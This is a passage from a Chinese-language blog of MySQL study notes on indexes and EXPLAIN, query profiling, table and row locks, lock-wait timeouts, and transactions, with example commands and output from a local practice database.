src="2792175-20220828181334197-1371778287.png" alt="image-20220827172521077"></p><p>查询年龄(age字段)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">##没有加索引的查询，<span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">25</span>意味着遍历了<span class="hljs-number">25</span>条数据才查出来有年龄<span class="hljs-operator">=</span><span class="hljs-number">22</span>的记录<br><span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">25</span><br>type<span class="hljs-operator">=</span><span class="hljs-keyword">ALL</span><span class="hljs-comment">---&gt;全表扫描</span><br>explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hellodb.students <span class="hljs-keyword">where</span> age<span class="hljs-operator">=</span><span class="hljs-number">22</span>;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181334489-484357407.png" alt="image-20220827172837889"></p><h3 id="创建索引：explain查看索引使用"><a href="#创建索引：explain查看索引使用" class="headerlink" title="创建索引：explain查看索引使用"></a>创建索引：explain查看索引使用</h3><p>MySQL内会有一定的优化，即使创建了索引也不一定使用，有时候全表查询快过索引的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students;<br><span class="hljs-keyword">create</span> INDEX idx_stuname(索引名称) <span class="hljs-keyword">on</span> students(name)(表名(字段名)); ##想截取字段名前几位，可以写(name(<span class="hljs-number">5</span>))<br>explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hellodb.students <span class="hljs-keyword">where</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Shi Zhongyu&#x27;</span>;<br><br>##结果：遍历了<span class="hljs-number">1</span>行就出来了，利用了索引进行查询<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181334776-1318141981.png" alt="image-20220827173958689"></p><p>姓名：一般都是左前缀匹配，这里查询以s开头的条目，也是利用了索引的，key这里都有用到idx_stuname</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hellodb.students <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;s%&#x27;</span>;<br>explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hellodb.students <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;s%&#x27;</span>;<br><span class="hljs-number">2</span>Shi Potian<span class="hljs-number">22</span>M<span class="hljs-number">1</span><span class="hljs-number">7</span><br><span class="hljs-number">6</span>Shi Qing<span class="hljs-number">46</span>M<span class="hljs-number">5</span><br><span class="hljs-number">1</span>Shi Zhongyu<span class="hljs-number">22</span>M<span class="hljs-number">2</span><span class="hljs-number">3</span><br><span class="hljs-number">25</span>Sun Dasheng<span class="hljs-number">100</span>M<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181335069-895777315.png" alt="image-20220827174640794"></p><h3 id="10万条记录表创建索引优化查询速度"><a href="#10万条记录表创建索引优化查询速度" class="headerlink" title="10万条记录表创建索引优化查询速度"></a>10万条记录表创建索引优化查询速度</h3><p>大表尽量避免做全表扫描</p><p>之前由存储过程生成的10w条记录的表testlog</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">##普通查询<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog;<br><span class="hljs-number">99995</span>wang12462<span class="hljs-number">573325</span><br><span class="hljs-number">99996</span>wang49273<span class="hljs-number">743714</span><br><span class="hljs-number">99997</span>wang24035<span class="hljs-number">970637</span><br><span class="hljs-number">99998</span>wang13211<span class="hljs-number">748677</span><br><span class="hljs-number">99999</span>wang34703<span class="hljs-number">489141</span><br><span class="hljs-number">100000</span>wang40460<span class="hljs-number">555592</span><br><br>##加入<span class="hljs-keyword">where</span>条件<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog <span class="hljs-keyword">where</span> salary<span class="hljs-operator">=</span><span class="hljs-number">489141</span>; <br>explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog <span class="hljs-keyword">where</span> salary<span class="hljs-operator">=</span><span class="hljs-number">489141</span>;<br><br>##创建salary的索引<br><span class="hljs-keyword">create</span> index idx_salary <span class="hljs-keyword">on</span> testlog(salary);<br><br>##查看<span class="hljs-keyword">sql</span>语句的执行情况，可以看到以索引来查询比没有索引的速度快了将近<span class="hljs-number">20</span>倍<br><span class="hljs-keyword">set</span> profiling<span class="hljs-operator">=</span><span class="hljs-keyword">ON</span>;<br><span class="hljs-keyword">show</span> profiles;<br><span class="hljs-keyword">show</span> profiles <span class="hljs-keyword">for</span> query ID;<br><br>遍历<span class="hljs-number">100</span>万条记录查询出一个salary的值，使用索引是<span class="hljs-number">0.0003</span>s，不使用索引是<span class="hljs-number">0.01</span>s，速度有很大的差别了<br>(root<span class="hljs-variable">@localhost</span>) [hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> profiles;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------------+-------------------------------------------+</span><br><span class="hljs-operator">|</span> Query_ID <span class="hljs-operator">|</span> Duration   <span class="hljs-operator">|</span> Query                                     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------------+-------------------------------------------+</span><br><span class="hljs-operator">|</span>        <span class="hljs-number">1</span> <span class="hljs-operator">|</span> <span class="hljs-number">0.00030300</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog <span class="hljs-keyword">where</span> salary<span class="hljs-operator">=</span><span class="hljs-number">489141</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>        <span class="hljs-number">2</span> <span class="hljs-operator">|</span> <span class="hljs-number">0.00007425</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">drop</span> index idx_salary <span class="hljs-keyword">from</span> testlog        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>        <span class="hljs-number">3</span> <span class="hljs-operator">|</span> <span class="hljs-number">0.00987600</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">drop</span> index idx_salary <span class="hljs-keyword">on</span> testlog          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>        <span class="hljs-number">4</span> <span class="hljs-operator">|</span> <span class="hljs-number">0.01724175</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> testlog <span class="hljs-keyword">where</span> salary<span class="hljs-operator">=</span><span class="hljs-number">489141</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+------------+-------------------------------------------+</span><br></code></pre></td></tr></table></figure><h1 id="MySQL并发控制：锁"><a href="#MySQL并发控制：锁" class="headerlink" title="MySQL并发控制：锁"></a>MySQL并发控制：锁</h1><p>手动添加锁分为</p><p>读锁：对表/行加锁，别人能读，但是不能更改</p><p>写锁：对表/行加锁，别人不能读/写，加上排他性，自己掌握控制权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">lock tables students lock_type(read<span class="hljs-operator">/</span>write)<br>lock tables students read<br><br>##加锁后的效果<br><span class="hljs-keyword">update</span> students <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">50</span> <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>ERROR <span class="hljs-number">1099</span> (HY000): <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;students&#x27;</span> was locked <span class="hljs-keyword">with</span> a READ lock <span class="hljs-keyword">and</span> can<span class="hljs-string">&#x27;t be updated</span><br><span class="hljs-string"></span><br><span class="hljs-string">##解锁后就可以写了</span><br><span class="hljs-string">unlock tables;</span><br><span class="hljs-string">update students set age=50 where stuid=1;</span><br><span class="hljs-string">Query OK, 0 rows affected (0.00 sec)</span><br><span class="hljs-string">Rows matched: 1  Changed: 0  Warnings: 0</span><br></code></pre></td></tr></table></figure><p>写锁：自己独占表/行的控制权，别的用户不能读或者写</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql">lock tables students write;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">/</span> <span class="hljs-keyword">update</span> <span class="hljs-operator">/</span><span class="hljs-keyword">delete</span>等更新操作都不行<br><br>##查看MySQL的进程正在干嘛<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> processlist;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+---------+---------+------+------------------------+------------------+</span><br><span class="hljs-operator">|</span> Id <span class="hljs-operator">|</span> <span class="hljs-keyword">User</span>            <span class="hljs-operator">|</span> Host      <span class="hljs-operator">|</span> db      <span class="hljs-operator">|</span> Command <span class="hljs-operator">|</span> <span class="hljs-type">Time</span> <span class="hljs-operator">|</span> State                  <span class="hljs-operator">|</span> Info             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+---------+---------+------+------------------------+------------------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> event_scheduler <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> Daemon  <span class="hljs-operator">|</span>   <span class="hljs-number">96</span> <span class="hljs-operator">|</span> Waiting <span class="hljs-keyword">on</span> <span class="hljs-keyword">empty</span> queue <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>             <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">8</span> <span class="hljs-operator">|</span> root            <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> hellodb <span class="hljs-operator">|</span> Query   <span class="hljs-operator">|</span>    <span class="hljs-number">0</span> <span class="hljs-operator">|</span> init                   <span class="hljs-operator">|</span> <span class="hljs-keyword">show</span> processlist <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+---------+---------+------+------------------------+------------------+</span><br><br>kill <span class="hljs-operator">+</span>id ##杀掉对应的blocking进程<br>unlock tables;<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+---------+-----------+</span><br><span class="hljs-operator">|</span> StuID <span class="hljs-operator">|</span> Name        <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span> ClassID <span class="hljs-operator">|</span> TeacherID <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+---------+-----------+</span><br><span class="hljs-operator">|</span>     <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Shi Zhongyu <span class="hljs-operator">|</span>  <span class="hljs-number">50</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span>       <span class="hljs-number">2</span> <span class="hljs-operator">|</span>         <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+---------+-----------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">6.30</span> sec)<br></code></pre></td></tr></table></figure><h2 id="死锁问题：事务执行没完成-未提交-未回滚"><a href="#死锁问题：事务执行没完成-未提交-未回滚" class="headerlink" title="死锁问题：事务执行没完成/未提交/未回滚"></a>死锁问题：事务执行没完成/未提交/未回滚</h2><p>user1在改user2的记录，由于innodb的特性，修改某一条记录的时候，会在这条row上面加锁，所以user1就无法修改，造成死锁；</p><p>user2修改user1正在改的数据，也会造成死锁</p><p>解决：MySQL内的机制会直接杀掉一个进程，unlock死锁</p><p>可以看到哪个user在搞</p><p>像这个使用了select * 查询表的，因为可能没做索引，所以需要遍历整张表，造成商城数据库性能达到瓶颈，已经不给操作了(读/写)—&gt;应该是对表加了写锁—&gt;死锁，别人读/写这张表都不行了，显示超时timeout之类的；</p><p>他是select *，不知道是对表级别的还是对行级别的，总之类似下单表之类的都无法执行读写了，即用户(相当于库的其他访问用户)无法下单，更新库的信息了，不能对表进行读/修改</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> processlist;<br>kill <span class="hljs-operator">+</span>query id;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181335359-1422421541.png" alt="image-20220828082629405"></p><p>死锁案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs sql">##如果加<span class="hljs-keyword">where</span>条件，就是单挑记录；如果不加<span class="hljs-keyword">where</span>，代表是整张表的修改<span class="hljs-comment">---&gt;不一样的</span><br><span class="hljs-keyword">update</span> stu <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">10</span>;<br><span class="hljs-keyword">update</span> stu <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">10</span> <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">90</span>;<br><br>##user1在执行这个事务，<span class="hljs-keyword">begin</span>，还没<span class="hljs-keyword">commit</span>，人走了<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">begin</span>;<span class="hljs-keyword">update</span> students <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">10</span> <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.00</span> sec)<br><span class="hljs-keyword">Rows</span> matched: <span class="hljs-number">1</span>  Changed: <span class="hljs-number">1</span>  Warnings: <span class="hljs-number">0</span><br><br><span class="hljs-keyword">commit</span>;<br><br>##user1 <span class="hljs-keyword">commit</span>后，才可以<br>##user2，修改stuid的值，发现一只卡住，就是死锁了，因为user1访问的事务还没提交，导致<span class="hljs-type">row</span>级别加了写锁，导致无法读写操作，user2对于这条<span class="hljs-type">row</span>的操作一直在等待<br>##报错:timeout<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">update</span> stu <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">20</span> <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">update</span> stu <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">20</span> <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>ERROR <span class="hljs-number">1205</span> (HY000): Lock wait timeout exceeded; try restarting transaction ##尝试重新提交事务<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">update</span> stu <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">20</span> <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.00</span> sec)<br><span class="hljs-keyword">Rows</span> matched: <span class="hljs-number">1</span>  Changed: <span class="hljs-number">1</span>  Warnings: <span class="hljs-number">0</span><br><br>##观察存储引擎<br><span class="hljs-keyword">show</span> innodb engine status;<br><br>##sleep <span class="hljs-number">673</span>代表一直在等待，干掉<br>##daemon代表守护进程<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> processlist;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+---------+---------+------+------------------------+------------------+</span><br><span class="hljs-operator">|</span> Id <span class="hljs-operator">|</span> <span class="hljs-keyword">User</span>            <span class="hljs-operator">|</span> Host      <span class="hljs-operator">|</span> db      <span class="hljs-operator">|</span> Command <span class="hljs-operator">|</span> <span class="hljs-type">Time</span> <span class="hljs-operator">|</span> State                  <span class="hljs-operator">|</span> Info             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+---------+---------+------+------------------------+------------------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> event_scheduler <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> Daemon  <span class="hljs-operator">|</span> <span class="hljs-number">3065</span> <span class="hljs-operator">|</span> Waiting <span class="hljs-keyword">on</span> <span class="hljs-keyword">empty</span> queue <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>             <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">11</span> <span class="hljs-operator">|</span> root            <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> hellodb <span class="hljs-operator">|</span> Sleep   <span class="hljs-operator">|</span>  <span class="hljs-number">673</span> <span class="hljs-operator">|</span>                        <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>             <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">13</span> <span class="hljs-operator">|</span> root            <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> hellodb <span class="hljs-operator">|</span> Query   <span class="hljs-operator">|</span>    <span class="hljs-number">0</span> <span class="hljs-operator">|</span> init                   <span class="hljs-operator">|</span> <span class="hljs-keyword">show</span> processlist <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+---------+---------+------+------------------------+------------------+</span><br><span class="hljs-number">3</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181335645-1243727137.png" alt="image-20220828111220786"></p><h1 id="MySQL事务"><a href="#MySQL事务" class="headerlink" title="MySQL事务"></a>MySQL事务</h1><p>事务：一组由SQL语句组成的整体，或者独立工作的单元—面试重点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##面试重点</span><br>事务的4个特性<br>A：原子性，整个事务中要么全部执行成功，要么全部失败回滚，唯一性，不可分割的步骤<br>C：一致性，必须遵循能量守恒定律，比如银行转账1000块，对方银行必定增加1000块，不存在转账后，1000块没了，双方平衡，双方加起来钱还是一致的<br>I：隔离性，即事务还未提交的时候，(还没显示结果)，别人看不到你提交了一半的事务的过程---&gt;dirty data脏数据，没有具体落地的东西<br>D：持久型，一旦事务提交，修改永久保存在数据库中<br></code></pre></td></tr></table></figure><p>事务的生命周期：</p><p>1.开始事务</p><p>2.执行其中的增删改查等SQL语句—&gt;一般为DML语句</p><p>3.提交(commit)/回滚(rollback)</p><p>4.更新到DB中</p><p><img src="2792175-20220828181336934-1817115279.png" alt="image-20220828090422967"></p><p>具体执行过程，一定要分开执行事务才行，每一条都是一个语句来的，要用分号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">begin</span>; ##<span class="hljs-keyword">begin</span>启动事务<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;catyer&#x27;</span>,<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;M&#x27;</span>); ##DML语句对表进行操作<br><span class="hljs-keyword">COMMIT</span>; ##提交<br><br><span class="hljs-keyword">rollback</span>; ##回滚事务，回滚自己这个用户的操作<br><br>##本地终端(操作用户)已经看到有记录生成了，别的终端还没看到<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;             <br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span> <span class="hljs-number">100</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">10</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">6</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">10</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">7</span> <span class="hljs-operator">|</span> catyer11      <span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+     </span><br><span class="hljs-number">7</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br><span class="hljs-number">1</span>Song Jiang<span class="hljs-number">100</span>M<br><span class="hljs-number">2</span>Zhang Sanfeng<span class="hljs-number">94</span>M<br><span class="hljs-number">3</span>Miejue Shitai<span class="hljs-number">77</span>F<br><span class="hljs-number">4</span>Lin Chaoying<span class="hljs-number">93</span>F<br><span class="hljs-number">5</span>catyer<span class="hljs-number">10</span>M<br><span class="hljs-number">6</span>catyer<span class="hljs-number">10</span>M<br><br>##执行<span class="hljs-keyword">commit</span>，别的用户可以看到了<br><span class="hljs-number">1</span>Song Jiang<span class="hljs-number">100</span>M<br><span class="hljs-number">2</span>Zhang Sanfeng<span class="hljs-number">94</span>M<br><span class="hljs-number">3</span>Miejue Shitai<span class="hljs-number">77</span>F<br><span class="hljs-number">4</span>Lin Chaoying<span class="hljs-number">93</span>F<br><span class="hljs-number">5</span>catyer<span class="hljs-number">10</span>M<br><span class="hljs-number">6</span>catyer<span class="hljs-number">10</span>M<br><span class="hljs-number">7</span>catyer11<span class="hljs-number">11</span>F<br></code></pre></td></tr></table></figure><p>注意：在未提交或者回滚后，别人是看不到这个结果的，事务的隔离性，还未提交，例如我在网站上填写一个表单，还没点击提交</p><h2 id="利用事务提高DML语句的执行速度"><a href="#利用事务提高DML语句的执行速度" class="headerlink" title="利用事务提高DML语句的执行速度"></a>利用事务提高DML语句的执行速度</h2><p>事务可以将待提交的SQL语句写入到MySQL的缓冲区中，类似git commit提交到暂存区，对比直接执行存储过程的速度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql">##批量化插入<span class="hljs-number">10</span>w条记录，用了大概<span class="hljs-number">2</span>s<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">begin</span>;<span class="hljs-keyword">call</span> sp_testlog;<span class="hljs-keyword">commit</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">2.35</span> sec)<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.05</span> sec)<br><br>##普通，用了<span class="hljs-number">50</span>多s<br><span class="hljs-keyword">call</span> sp_testlog;<br>(root<span class="hljs-variable">@localhost</span>) [hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">call</span> sp_testlog;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">57.04</span> sec)<br><br>##一共有<span class="hljs-number">30</span>w条记录，没问题<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> testlog;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">count</span>(<span 